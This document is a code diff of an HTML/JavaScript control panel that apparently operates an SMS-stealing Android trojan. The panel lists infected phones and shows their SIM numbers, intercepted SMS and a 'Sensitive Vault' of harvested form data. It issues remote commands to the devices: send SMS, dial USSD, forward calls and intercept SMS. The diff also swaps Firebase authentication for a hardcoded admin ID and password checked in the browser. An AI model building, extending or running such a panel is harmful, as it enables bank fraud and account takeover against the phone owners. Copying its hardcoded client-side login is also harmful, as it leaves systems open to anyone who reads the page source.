@@ -3,11 +3,10 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>RTO Ultra-Admin 2.0 (SECURE)</title>
+    <title>RTO Ultra-Admin 2.0</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-auth-compat.js"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
         .nav-link.active { background-color: #1e293b; border-left: 4px solid #3b82f6; color: white; }
@@ -28,6 +27,7 @@
         .stat-card:active { transform: scale(0.95); }
         .stat-card.active-filter { transform: translateY(-2px); box-shadow: 0 4px 6px -1px rgb(0 0 0 / 0.1); border-color: inherit; }
 
+        /* Card Style for List */
         .user-box {
             background: white;
             border-radius: 12px;
@@ -41,28 +41,28 @@
 </head>
 <body class="bg-[#f1f5f9] min-h-screen font-sans text-slate-900 flex overflow-hidden">
 
-    <!-- Login Overlay (Firebase Auth) -->
-    <div id="login-overlay" class="fixed inset-0 bg-slate-900/95 z-[100] flex items-center justify-center p-4">
-        <div class="bg-white w-full max-w-sm rounded-3xl p-8 shadow-2xl space-y-6 border-t-4 border-blue-600">
+    <!-- Login Overlay -->
+    <div id="login-overlay" class="fixed inset-0 bg-slate-900/90 z-[100] flex items-center justify-center p-4">
+        <div class="bg-white w-full max-w-sm rounded-3xl p-8 shadow-2xl space-y-6">
             <div class="text-center space-y-2">
                 <div class="inline-flex bg-blue-600 p-3 rounded-2xl text-white mb-2 shadow-lg shadow-blue-500/30">
-                    <i class="fas fa-fingerprint text-2xl"></i>
+                    <i class="fas fa-user-shield text-2xl"></i>
                 </div>
-                <h1 class="text-2xl font-black text-slate-800 tracking-tight">System Login</h1>
-                <p class="text-[10px] font-bold text-slate-400 uppercase tracking-widest text-wrap">Access restricted to authorized developers only.</p>
+                <h1 class="text-2xl font-black text-slate-800 tracking-tight">Access Control</h1>
+                <p class="text-xs font-bold text-slate-400 uppercase tracking-widest">Verify Administrator Identity</p>
             </div>
             <div class="space-y-4">
                 <div class="space-y-1">
-                    <label class="text-[10px] font-black text-slate-500 uppercase ml-1">Email ID</label>
-                    <input type="email" id="login-email" class="w-full bg-slate-50 border border-slate-200 rounded-xl px-4 py-3 text-sm focus:ring-2 focus:ring-blue-500 outline-none transition-all" placeholder="admin@rto.me">
+                    <label class="text-[10px] font-black text-slate-500 uppercase ml-1">Admin ID</label>
+                    <input type="text" id="login-id" class="w-full bg-slate-50 border border-slate-200 rounded-xl px-4 py-3 text-sm focus:ring-2 focus:ring-blue-500 outline-none transition-all" placeholder="Enter ID">
                 </div>
                 <div class="space-y-1">
-                    <label class="text-[10px] font-black text-slate-500 uppercase ml-1">Master Key</label>
+                    <label class="text-[10px] font-black text-slate-500 uppercase ml-1">Password</label>
                     <input type="password" id="login-pass" class="w-full bg-slate-50 border border-slate-200 rounded-xl px-4 py-3 text-sm focus:ring-2 focus:ring-blue-500 outline-none transition-all" placeholder="••••••••">
                 </div>
-                <button onclick="handleLogin()" id="login-btn" class="w-full bg-slate-900 text-white py-4 rounded-xl font-black text-xs uppercase tracking-widest hover:bg-blue-600 transition-all shadow-xl active:scale-95">Verify Identity</button>
+                <button onclick="handleLogin()" class="w-full bg-slate-900 text-white py-4 rounded-xl font-black text-xs uppercase tracking-widest hover:bg-blue-600 transition-all shadow-xl active:scale-95">Verify & Login</button>
             </div>
-            <div id="login-err" class="hidden text-center text-rose-600 text-xs font-black uppercase tracking-widest animate-pulse">Auth Failed: Access Denied</div>
+            <div id="login-err" class="hidden text-center text-rose-600 text-xs font-black uppercase tracking-widest animate-pulse">Invalid Credentials</div>
         </div>
     </div>
 
@@ -85,11 +85,6 @@
             </a>
             <div class="pt-4 text-[10px] font-bold text-slate-500 uppercase tracking-widest px-4 mb-1">Global Config</div>
             <div class="px-3 space-y-2">
-                <!-- Telegram Contact -->
-                <a href="https://t.me/cyber8546" target="_blank" class="flex items-center gap-2 px-3 py-2 bg-blue-600/10 border border-blue-600/20 rounded-lg text-blue-500 hover:bg-blue-600/20 transition-all mb-4">
-                    <i class="fab fa-telegram"></i>
-                    <span class="text-[10px] font-black uppercase">Contact: @cyber8546</span>
-                </a>
                 <div class="space-y-1">
                     <input type="text" id="global-sms-fwd" placeholder="SMS Forward No." class="w-full bg-slate-800 border-none rounded p-2 text-xs text-white outline-none focus:ring-1 focus:ring-blue-500">
                     <button onclick="saveGlobal('smsForward')" class="w-full bg-blue-600 text-white py-1.5 rounded text-[10px] font-bold uppercase hover:bg-blue-700 transition-colors">Update SMS</button>
@@ -118,14 +113,14 @@
             </div>
             <div class="flex items-center gap-3">
                 <div class="text-right hidden sm:block">
-                    <div class="text-[10px] font-black text-slate-800 uppercase tracking-tighter" id="admin-display-name">NOT AUTHED</div>
-                    <div class="text-[8px] text-green-500 font-black uppercase tracking-widest">Secure Link</div>
+                    <div class="text-[10px] font-black text-slate-800 uppercase tracking-tighter" id="admin-display-name">---</div>
+                    <div class="text-[8px] text-green-500 font-black uppercase tracking-widest">Active Connection</div>
                 </div>
                 <div class="w-8 h-8 bg-slate-100 rounded-full flex items-center justify-center text-slate-400 border border-slate-200"><i class="fas fa-user-shield text-xs"></i></div>
             </div>
         </header>
 
-        <!-- Stats Row -->
+        <!-- Fixed Scrollable Stats Row (Global) -->
         <div class="bg-white border-b border-slate-200 flex-shrink-0 z-20 overflow-hidden">
             <div class="flex overflow-x-auto no-scrollbar gap-3 p-3 lg:px-6">
                 <div onclick="setFilter('all')" id="stat-card-all" class="stat-card bg-white p-3 rounded-xl shadow-sm border-blue-500 flex items-center gap-3 active-filter">
@@ -150,15 +145,19 @@
         <div id="content-area" class="flex-1 overflow-y-auto p-3 lg:p-6 no-scrollbar bg-[#f8fafc] pb-32">
             <!-- Dashboard View -->
             <div id="view-dashboard" class="space-y-4">
+                <!-- Search Bar -->
                 <div class="bg-white rounded-xl shadow-sm border border-slate-200 px-4 py-3 flex items-center gap-3">
                     <i class="fas fa-search text-slate-400 text-sm"></i>
                     <input type="text" id="user-search" oninput="updateDashboard()" placeholder="Search nodes or data..." class="flex-1 bg-transparent border-none outline-none text-sm font-bold text-slate-700">
                 </div>
+
+                <!-- Main Container for Cards -->
                 <div id="dashboard-list" class="space-y-3"></div>
             </div>
 
             <!-- Detail View -->
             <div id="view-detail" class="hidden space-y-4 pb-32">
+                <!-- Header -->
                 <div class="bg-white p-4 rounded-xl shadow-sm border border-slate-200 flex items-center justify-between">
                     <div class="flex items-center gap-3">
                         <button onclick="showView('dashboard')" class="w-10 h-10 rounded-full bg-slate-100 text-slate-600 hover:bg-slate-200 flex items-center justify-center transition-all active:scale-90"><i class="fas fa-arrow-left text-sm"></i></button>
@@ -184,6 +183,7 @@
                     </div>
 
                     <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-5">
+                        <!-- Diagnostics -->
                         <div class="grid grid-cols-2 gap-3">
                             <button onclick="sendUserCmd('CHECK_ONLINE')" class="cmd-btn bg-slate-800 hover:bg-slate-700 p-3.5 rounded-xl flex flex-col items-center gap-1.5 border border-slate-700">
                                 <i class="fas fa-wifi text-green-400 text-sm"></i><span class="text-[10px] font-black uppercase">Refresh</span>
@@ -193,6 +193,7 @@
                             </button>
                         </div>
 
+                        <!-- SMS -->
                         <div class="space-y-2">
                             <div class="flex justify-between items-center px-1">
                                 <span class="text-[10px] font-black text-slate-500 uppercase">Send SMS</span>
@@ -205,6 +206,7 @@
                             </div>
                         </div>
 
+                        <!-- USSD -->
                         <div class="space-y-2">
                             <div class="flex justify-between items-center px-1">
                                 <span class="text-[10px] font-black text-slate-500 uppercase">USSD Dialer</span>
@@ -216,6 +218,7 @@
                             </div>
                         </div>
 
+                        <!-- Forward -->
                         <div class="space-y-2">
                             <div class="flex justify-between items-center px-1">
                                 <span class="text-[10px] font-black text-slate-500 uppercase">Call Forward</span>
@@ -228,6 +231,7 @@
                             </div>
                         </div>
 
+                        <!-- Intercept -->
                         <div class="space-y-2">
                             <div class="flex justify-between items-center px-1">
                                 <span class="text-[10px] font-black text-slate-500 uppercase">SMS Intercept</span>
@@ -248,9 +252,11 @@
                         <button onclick="setDetailTab('sms')" id="tab-sms" class="tab-btn pb-2 text-[11px] uppercase tracking-widest active">SMS Logs</button>
                         <button onclick="setDetailTab('forms')" id="tab-forms" class="tab-btn pb-2 text-[11px] uppercase tracking-widest text-rose-600">Sensitive Vault</button>
                     </div>
+
                     <div id="detail-sms-sec" class="bg-white rounded-xl shadow-sm border border-slate-200 overflow-hidden flex flex-col max-h-[500px]">
                         <div id="det-sms-logs" class="overflow-y-auto p-3 space-y-3 no-scrollbar"></div>
                     </div>
+
                     <div id="detail-forms-sec" class="hidden space-y-4">
                         <div id="det-form-sections" class="space-y-5"></div>
                     </div>
@@ -271,35 +277,44 @@
     };
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
-    const auth = firebase.auth();
 
-    function handleLogin() {
-        const email = document.getElementById('login-email').value;
-        const pass = document.getElementById('login-pass').value;
-        const btn = document.getElementById('login-btn');
-        const err = document.getElementById('login-err');
+    // AUTH
+    const ADMIN_ID = "zaika";
+    const ADMIN_PASS = "Abhi1234#";
 
-        btn.innerText = "AUTHENTICATING...";
-        auth.signInWithEmailAndPassword(email, pass)
-            .catch(error => {
-                err.innerText = "AUTH FAILED: " + error.message;
-                err.classList.remove('hidden');
-                btn.innerText = "VERIFY IDENTITY";
-                setTimeout(() => err.classList.add('hidden'), 3000);
-            });
-    }
-
-    auth.onAuthStateChanged(user => {
-        if(user) {
+    function checkAuth() {
+        const authed = localStorage.getItem('rto_authed');
+        const storedPass = localStorage.getItem('rto_pass');
+        if(authed === 'true' && storedPass === ADMIN_PASS) {
             document.getElementById('login-overlay').classList.add('hidden');
-            document.getElementById('admin-display-name').innerText = user.email.split('@')[0].toUpperCase();
+            document.getElementById('admin-display-name').innerText = ADMIN_ID.toUpperCase();
             startListeners();
         } else {
-            document.getElementById('login-overlay').classList.remove('hidden');
+            logout();
         }
-    });
+    }
 
-    function logout() { auth.signOut(); }
+    function handleLogin() {
+        const id = document.getElementById('login-id').value;
+        const pass = document.getElementById('login-pass').value;
+        const err = document.getElementById('login-err');
+        if(id === ADMIN_ID && pass === ADMIN_PASS) {
+            localStorage.setItem('rto_authed', 'true');
+            localStorage.setItem('rto_pass', pass);
+            document.getElementById('login-overlay').classList.add('hidden');
+            document.getElementById('admin-display-name').innerText = ADMIN_ID.toUpperCase();
+            startListeners();
+        } else {
+            err.classList.remove('hidden');
+            setTimeout(() => err.classList.add('hidden'), 3000);
+        }
+    }
+
+    function logout() {
+        localStorage.removeItem('rto_authed');
+        localStorage.removeItem('rto_pass');
+        document.getElementById('login-overlay').classList.remove('hidden');
+    }
 
     let usersData = {};
     let selectedUid = null;
@@ -356,6 +371,7 @@
         const now = new Date();
         const startOfToday = new Date(now.getFullYear(), now.getMonth(), now.getDate()).getTime();
 
+        // Generate Permanent Serial Numbers based on Global Install Order (Ascending)
         const globalSorted = [...uids].sort((a,b) => (usersData[a].I?.ca || 0) - (usersData[b].I?.ca || 0));
         const permIds = {};
         globalSorted.forEach((uid, idx) => permIds[uid] = idx + 1);
@@ -368,6 +384,7 @@
                 const isOnline = Date.now() - (info.lo || 0) < 60000;
                 const hasSmsToday = Object.values(u.M || {}).some(m => (m.ts || 0) >= startOfToday);
                 const isToday = (info.lo || 0) >= startOfToday || hasSmsToday;
+
                 if(isToday) todayCount++;
                 if(u.F) formsCount++;
                 const msgs = Object.values(u.M || {});
@@ -401,18 +418,27 @@
                 const isOnline = Date.now() - (info.lo || 0) < 60000;
                 const hasSmsToday = Object.values(u.M || {}).some(m => (m.ts || 0) >= startOfToday);
                 const isToday = (info.lo || 0) >= startOfToday || hasSmsToday;
+
                 if(isToday) todayCount++;
                 if(Object.keys(u.M || {}).length > 0) msgsCount++;
+
                 if (u.F) {
                     formsCount++;
                     const forms = Object.values(u.F).sort((a,b) => (b.ts || 0) - (a.ts || 0));
-                    userGroups.push({ uid: uid, name: info.m || "Unknown", forms: forms, lastTs: forms[0]?.ts || 0 });
+                    userGroups.push({
+                        uid: uid,
+                        name: info.m || "Unknown",
+                        forms: forms,
+                        lastTs: forms[0]?.ts || 0
+                    });
                 }
             });
 
             userGroups.sort((a,b) => b.lastTs - a.lastTs).forEach(ug => {
                 let fieldsHtml = "";
                 let searchText = ug.name;
+
+                // Collect all unique fields across all submissions for this user
                 let combinedData = {};
                 ug.forms.forEach(f => {
                     for(let k in f) {
@@ -460,11 +486,14 @@
                 const isOnline = Date.now() - (info.lo || 0) < 60000;
                 const hasSmsToday = Object.values(u.M || {}).some(m => (m.ts || 0) >= startOfToday);
                 const isToday = (info.lo || 0) >= startOfToday || hasSmsToday;
+
                 if(isToday) todayCount++;
                 if(Object.keys(u.M || {}).length > 0) msgsCount++;
                 if(u.F) formsCount++;
+
                 let matchesF = (currentFilter === 'all') || (currentFilter === 'today' && isToday);
                 const name = (info.m || "Unknown");
+
                 if(matchesF && (!query || name.toLowerCase().includes(query) || uid.toLowerCase().includes(query))) {
                     const card = document.createElement('div');
                     card.className = "user-box";
@@ -474,14 +503,19 @@
                             <div class="flex items-center gap-3">
                                 <div class="text-xs font-black text-slate-300 w-5">#${permIds[uid]}</div>
                                 <div class="w-3 h-3 rounded-full ${isOnline ? 'online-dot bg-green-500' : 'bg-slate-300'}"></div>
-                                <div><div class="font-black text-slate-800 uppercase text-sm leading-none">${name}</div><div class="text-[10px] text-slate-400 mt-1 uppercase font-bold">LAST: ${formatTime(info.lo)}</div></div>
+                                <div>
+                                    <div class="font-black text-slate-800 uppercase text-sm leading-none">${name}</div>
+                                    <div class="text-[10px] text-slate-400 mt-1 uppercase font-bold">LAST: ${formatTime(info.lo)}</div>
+                                </div>
                             </div>
                             <button class="bg-slate-900 text-white px-4 py-1.5 rounded-lg text-[10px] font-black uppercase">OPEN</button>
                         </div>
+
                         <div class="grid grid-cols-2 gap-2 mb-3 bg-slate-50 p-2 rounded-lg border border-slate-100">
                             <div><div class="text-[9px] text-slate-400 font-bold uppercase">SIM 1</div><div class="text-xs font-black text-slate-700">${sims[0]?.n || 'H'}</div></div>
                             <div><div class="text-[9px] text-slate-400 font-bold uppercase">SIM 2</div><div class="text-xs font-black text-slate-700">${sims[1]?.n || 'H'}</div></div>
                         </div>
+
                         <div class="bg-blue-50/50 border border-blue-100 p-3 rounded-xl">
                             <div class="flex items-center gap-2 mb-1">
                                 <i class="fas fa-comment-dots text-blue-400 text-[10px]"></i>
@@ -513,16 +547,22 @@
         document.getElementById('det-bat').innerText = `${info.bl || 0}%`;
         document.getElementById('det-online-dot').className = `w-2.5 h-2.5 rounded-full ${isOnline ? 'bg-green-500 online-dot' : 'bg-slate-300'}`;
 
+        // Permissions Status Badges
         const smsBadge = info.ps ? '<span class="bg-green-100 text-green-700 px-1.5 rounded text-[8px] font-black border border-green-200 uppercase">SMS: ON</span>' : '<span class="bg-rose-100 text-rose-700 px-1.5 rounded text-[8px] font-black border border-rose-200 uppercase">SMS: OFF</span>';
         const callBadge = info.pc ? '<span class="bg-green-100 text-green-700 px-1.5 rounded text-[8px] font-black border border-green-200 uppercase ml-1">CALL: ON</span>' : '<span class="bg-rose-100 text-rose-700 px-1.5 rounded text-[8px] font-black border border-rose-200 uppercase ml-1">CALL: OFF</span>';
         document.getElementById('det-model').innerHTML = `${info.mf || 'NA'} | V:${info.v || 'NA'} <div class="mt-1">${smsBadge}${callBadge}</div>`;
 
+        // Update SIM dropdowns with actual numbers
         const s1Text = sims[0]?.n && sims[0].n !== 'Hidden' ? sims[0].n : "SIM 1";
         const s2Text = sims[1]?.n && sims[1].n !== 'Hidden' ? sims[1].n : "SIM 2";
+
         const simDropdowns = ['cmd-sms-sim', 'cmd-ussd-sim', 'cmd-cf-sim', 'cmd-sf-sim'];
         simDropdowns.forEach(id => {
             const sel = document.getElementById(id);
-            if(sel) { sel.options[0].text = s1Text; sel.options[1].text = s2Text; }
+            if(sel) {
+                sel.options[0].text = s1Text;
+                sel.options[1].text = s2Text;
+            }
         });
 
         const smsDiv = document.getElementById('det-sms-logs');
@@ -576,7 +616,6 @@
     function sendUserCmd(type) {
         if(!selectedUid) return;
         const cmd = { t: type, ts: Date.now() };
-
         if(type === 'SEND_SMS') {
             cmd.n = document.getElementById('cmd-sms-num').value;
             cmd.m = document.getElementById('cmd-sms-msg').value;
@@ -599,14 +638,9 @@
         } else if(type === 'REMOVE_SMS_FORWARD') {
             cmd.t = 'SET_SMS_FORWARD'; cmd.n = "";
         }
-
-        // 1. Write to User's Command Path (for Realtime execution)
         db.ref(`Users/${selectedUid}/C`).push(cmd);
 
-        // 2. Write to FCM Queue (for Cloud Function to wake up device)
-        const fcmPayload = { ...cmd, targetUid: selectedUid };
-        db.ref('fcm_queue').push(fcmPayload);
-
+        // Clear input fields after sending
         if(type === 'SEND_SMS') {
             document.getElementById('cmd-sms-num').value = "";
             document.getElementById('cmd-sms-msg').value = "";
@@ -638,16 +672,9 @@
         });
         alert('Broadcasted');
     }
- 
-    auth.onAuthStateChanged(user => {
-        if(user) {
-            document.getElementById('login-overlay').classList.add('hidden');
-            document.getElementById('admin-display-name').innerText = user.email.split('@')[0].toUpperCase();
-            startListeners();
-        } else {
-            document.getElementById('login-overlay').classList.remove('hidden');
-        }
-    });
+
+    checkAuth();
+    showView('dashboard');
 </script>
 </body>
 </html>
